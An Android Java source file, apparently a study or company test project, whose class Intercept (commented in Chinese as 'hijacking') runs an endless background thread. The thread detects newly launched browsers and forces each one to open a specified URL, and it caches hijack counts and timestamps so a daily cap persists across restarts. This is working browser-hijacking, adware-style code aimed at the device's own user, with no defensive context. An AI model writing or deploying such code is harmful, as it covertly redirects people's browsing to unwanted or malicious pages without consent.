package com.tang.study.companytest1;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.util.Log;

import java.util.List;

/**
 * 检测到有浏览器打开，跳转指定网页（劫持）
 * @author shuiming.tang
 * @date 2016-04-26
 */
public class Intercept {
    /**缓存劫持数据的文件名*/
    public static final String SAVE_FILE_NAME = "interceptDataFile";
    /**缓存第一次劫持的时间*/
    public static final String FIRTST_LAUCHER_TIME = "firstLauTime";
    /**缓存劫持的次数*/
    public static final String INDEX_COUNT = "indexCount";
    private Context mContext;
    /**用来记录浏览器是否启动的状态*/
    private boolean isLaucher;
    /**记录启动浏览器个数*/
    private static int count;
    /**记录第一次启动的时间*/
    private static long firstLauTime;
    /**记录劫持的次数*/
    private int indexCount;

    private Intercept(Context context){
        mContext = context;
    }
    private static Intercept instance;
    public static Intercept getInstance(Context context){
        if(instance == null){
            synchronized (Intercept.class){
                if(instance == null){
                    instance = new Intercept(context);
                    Log.e("Cat", "Intercept new instance() success");
                }
            }
        }
        return instance;
    }
    /**更改启动状态*/
    public void changeStatus(boolean isLaucher){
//        Logger.showOnUI(mContext," changeStatus(...)");
        this.isLaucher = isLaucher;
    }

    /**劫持方法*/
    public void doInter(final int maxTimes,final String jumpUri){
        if(mContext == null){
            return;
        }
//        Logger.showOnUI(mContext," doInter(...) begin check");
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<String> runningList = null;
                SharedPreferences sharedPreferences = mContext.getSharedPreferences(
                        SAVE_FILE_NAME, Context.MODE_PRIVATE);
                while(true){
                    Log.e("Cat", "劫持监测...");
                    firstLauTime = sharedPreferences.getLong(FIRTST_LAUCHER_TIME, 0);//每次获取缓存的第一次拦截的时间
                    //如果时间超过1天，所有状态还原
                    if(firstLauTime != 0 && (System.currentTimeMillis() - firstLauTime) > 24*60*60*1000){//
                        isLaucher = false;
                        count = 0;
                        indexCount = 0;
                        getEditor(SAVE_FILE_NAME).clear();//清空缓存
                    }else {

                        if(indexCount >= maxTimes){
                            break;//如果达到最大拦截次数，结束循环
                        }
                        //获取到所有启动的浏览器
                        runningList = BrowsableUtil.getLaucherPro(mContext);
                        if (!(runningList == null || runningList.size() == 0)) {

                            if (isLaucher && (runningList.size() - count) > 0) {//如果新启动浏览器
                                count = runningList.size();
                                isLaucher = true;
                                Log.e("Cat", "检测到最新启动的浏览器：" + runningList.get(runningList.size() - 1));
//                                Logger.showOnUI(mContext, "检测到最新启动的浏览器：" + runningList.get(runningList.size() - 1));
                                //跳转指定Url
                                Intent intent = new Intent(Intent.ACTION_VIEW);
                                intent.setPackage(runningList.get(runningList.size() - 1));
                                intent.setData(Uri.parse(jumpUri));
                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                //记录拦截的次数
                                indexCount++;
                                Log.e("Cat", "doInter() true 跳转指定网页...");
                                mContext.startActivity(intent);
//                                jumpSpeWeb(runningList, jumpUri);
                            }
                            if (!isLaucher) {
                                //
                                indexCount = sharedPreferences.getInt(INDEX_COUNT, 0);
                                Log.e("Cat", "indexCont:" + indexCount);
                                firstLauTime = System.currentTimeMillis();
                                SharedPreferences.Editor editor = getEditor(SAVE_FILE_NAME);
                                editor.putLong(FIRTST_LAUCHER_TIME,firstLauTime);//缓存第一次拦截的时间进本地
                                editor.commit();
                                //第一次启动
                                count = runningList.size();
                                isLaucher = true;
                                Log.e("Cat", "检测到最新启动的浏览器：" + runningList.get(runningList.size() - 1));
//                                Logger.showOnUI(mContext, "检测到最新启动的浏览器：" + runningList.get(runningList.size() - 1));
                                //跳转指定Url
                                Intent intent = new Intent(Intent.ACTION_VIEW);
                                intent.setPackage(runningList.get(runningList.size() - 1));
                                intent.setData(Uri.parse(jumpUri));
                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                //记录拦截的次数
                                indexCount++;
                                Log.e("Cat", "doInter()false 跳转指定网页...");
                                mContext.startActivity(intent);

//                               jumpSpeWeb(runningList, jumpUri);
                            }

                        } else {
                            count = 0;
                            if (isLaucher) {
                                isLaucher = false;
                            }
                        }

                    }

                }//while
            }
        }).start();
    }
    /**跳转指定网页方法*/
    public void jumpSpeWeb(List<String> runningList, String jumpUri){
//        Logger.showOnUI(mContext,"jumpSpeWeb begin");
        if(mContext == null){
            return;
        }
//        Logger.showOnUI(mContext,"jumpSpeWeb after");
        //跳转指定Url
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setPackage(runningList.get(runningList.size() - 1));
        intent.setData(Uri.parse(jumpUri));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        mContext.startActivity(intent);
    }
    /**当程序被结束掉或者挂掉*/
    public void killAction(){
//        Logger.showOnUI(mContext,"killAction()...");
        isLaucher = false;
        count = 0;
        //如果程序被杀掉，缓存拦截的次数进本地
        if(indexCount != 0){//有拦截次数
            SharedPreferences.Editor editor = getEditor(SAVE_FILE_NAME);
            editor.putInt(INDEX_COUNT, indexCount);
            editor.commit();
        }
    }
    public SharedPreferences.Editor getEditor(String saveFile){
//        Logger.showOnUI(mContext,"getEditor() begin");
        SharedPreferences.Editor editor = null;
        if(mContext != null){
            SharedPreferences sharedPreferences = mContext.getSharedPreferences(saveFile, Context.MODE_PRIVATE);
            editor = sharedPreferences.edit();
//            Logger.showOnUI(mContext,"getEditor() end");
        }

        return editor;
    }
}
